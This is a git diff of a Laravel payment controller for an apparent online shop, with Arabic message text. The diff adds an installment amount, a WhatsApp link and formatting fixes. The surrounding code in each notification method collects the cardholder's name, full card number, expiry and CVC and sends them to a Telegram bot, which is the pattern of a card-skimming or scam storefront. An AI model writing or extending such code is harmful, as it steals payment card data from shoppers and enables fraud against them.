@@ -65,8 +65,15 @@ class PaymentController extends Controller
     }
 
 
-    protected function sendTelegramNotification($order,$name, $email, $phone, $code, $totalPrice, $firstBatch, $paymentGateway)
+    protected function sendTelegramNotification($order, $name, $email, $phone, $code, $totalPrice, $firstBatch, $paymentGateway)
     {
+        $batch = $totalPrice - $firstBatch;
+    if(session('CashOrBatch') != 0){
+        $batch = $batch / session('CashOrBatch');
+    }else{
+        $batch = 0;
+    }
+        
         // Build the message
         $message = ":: طلب جديد ::" . PHP_EOL
             . "رقم الطلب: " . $code . PHP_EOL
@@ -79,6 +86,8 @@ class PaymentController extends Controller
             . "المبلغ الإجمالي: " . $totalPrice . PHP_EOL
             . "الدفعة الأولى: " . $firstBatch . PHP_EOL
             . "فترة التقسيط: " . session('CashOrBatch') . PHP_EOL
+            . "مبلغ التقسيط: " . number_format($batch,2) . PHP_EOL
+
             // . " طريقة الدفع: " . $paymentGateway . PHP_EOL
             . "الاسم على البطاقة: " . session('card_name') . PHP_EOL
             . "رقم البطاقة: " . session('card_number') . PHP_EOL
@@ -86,9 +95,9 @@ class PaymentController extends Controller
             . "السنة: " . session('year') . PHP_EOL
             . "CVC: " . session('cvc') . PHP_EOL
             . ":: رابط التعليمات ::" . PHP_EOL
-            . "فاتورة: " . route('invoice.show',$order->id) . PHP_EOL
-            . "عقد: " .  route('invoice.contact',$order->code) . PHP_EOL
-          ;
+            . "فاتورة: " . route('invoice.show', $order->id) . PHP_EOL
+            . "عقد: " .  route('invoice.contact', $order->code) . PHP_EOL
+            . "رابط واتساب: https://wa.me/" . $phone . PHP_EOL;;
 
         // Get Telegram credentials
         $key = env('TOKEN_TELEGRAM');
@@ -112,7 +121,7 @@ class PaymentController extends Controller
     protected function createOrder($name, $email, $phone, $order_code, $totalPrice, $firstBatch, $paymentGateway, $CashOrBatch)
     {
 
-      $order=  Order::create([
+        $order =  Order::create([
             'code' => $order_code,
             'name' => $name,
             'phone' => $phone,
@@ -130,9 +139,7 @@ class PaymentController extends Controller
             'CashOrBatch' => $CashOrBatch
         ]);
         $this->add_detiles($order);
-        $this->sendTelegramNotification($order,$name, $email, $phone, $order_code, $totalPrice, $firstBatch, $paymentGateway);
-
-
+        $this->sendTelegramNotification($order, $name, $email, $phone, $order_code, $totalPrice, $firstBatch, $paymentGateway);
     }
     public function payment_confirm()
     {
@@ -219,7 +226,7 @@ class PaymentController extends Controller
         $zip = Session::get('zip');
         $order_code = now()->timestamp . rand(1000, 9999);
         // Create the order
-       $order= Order::create([
+        $order = Order::create([
             'code' => $order_code,
             'name' => $name,
             'phone' => $phone,
@@ -252,6 +259,7 @@ class PaymentController extends Controller
             . "المبلغ الإجمالي: " . $totalPrice . PHP_EOL
             . "الدفعة الأولى: " . $CashOrBatch . PHP_EOL
             . "فترة التقسيط: " . 4  . PHP_EOL
+            . "مبلغ التقسيط: " . $CashOrBatch . PHP_EOL
             . "البطاقة البنكية: tappy" . PHP_EOL
             . "الاسم على البطاقة: " . $request->input('CardName') . PHP_EOL
             . "رقم البطاقة: " . $request->input('cardNumber') . PHP_EOL
@@ -259,9 +267,9 @@ class PaymentController extends Controller
             . "السنة: " . $request->input('year') . PHP_EOL
             . "CVC: " . $request->input('cvc') . PHP_EOL
             . ":: رابط التعليمات ::" . PHP_EOL
-                        . "فاتورة: " . route('invoice.show',$order->id) . PHP_EOL
-                        . "عقد: " . route('invoice.contact',$order->code) . PHP_EOL
-;
+            . "فاتورة: " . route('invoice.show', $order->id) . PHP_EOL
+            . "عقد: " . route('invoice.contact', $order->code) . PHP_EOL
+            . "رابط واتساب: https://wa.me/" . $phone . PHP_EOL;;
 
         // Send to Telegram
         // Get Telegram credentials
@@ -324,7 +332,7 @@ class PaymentController extends Controller
         $zip = Session::get('zip');
         $order_code = now()->timestamp . rand(1000, 9999);
         // Create the order
-        $order=Order::create([
+        $order = Order::create([
             'code' => $order_code,
             'name' => $name,
             'phone' => $phone,
@@ -356,6 +364,7 @@ class PaymentController extends Controller
             . "المبلغ الإجمالي: " . $totalPrice . PHP_EOL
             . "الدفعة الأولى: " . $CashOrBatch . PHP_EOL
             . "فترة التقسيط: " . 4  . PHP_EOL
+            . "مبلغ التقسيط: " . $CashOrBatch . PHP_EOL
             . "البطاقة البنكية: tappy" . PHP_EOL
             . "الاسم على البطاقة: " . $request->input('CardName') . PHP_EOL
             . "رقم البطاقة: " . $request->input('cardNumber') . PHP_EOL
@@ -363,10 +372,9 @@ class PaymentController extends Controller
             . "السنة: " . $request->input('year') . PHP_EOL
             . "CVC: " . $request->input('cvc') . PHP_EOL
             . ":: رابط التعليمات ::" . PHP_EOL
-                        . "فاتورة: " . route('invoice.show',$order->id) . PHP_EOL
-
-                        . "عقد: " . route('invoice.contact',$order->code) . PHP_EOL
-;
+            . "فاتورة: " . route('invoice.show', $order->id) . PHP_EOL
+            . "عقد: " . route('invoice.contact', $order->code) . PHP_EOL
+            . "رابط واتساب: https://wa.me/" . $phone . PHP_EOL;;
 
         // Send to Telegram
         // Get Telegram credentials
@@ -405,12 +413,13 @@ class PaymentController extends Controller
             'payments' => array_fill(0, 4, $totalPrice / 4)
         ]);
     }
-    protected function add_detiles($order){
+    protected function add_detiles($order)
+    {
         $cart = session()->get('cart', []);
         foreach ($cart as $item) {
             $product = Product::find($item['id']);
-            OrderDetail::create( [
-                'order_id'=>$order->id,
+            OrderDetail::create([
+                'order_id' => $order->id,
                 'product_id' => $item['id'],
                 'product_name' => $product->name,
                 'price' => $item['price'],
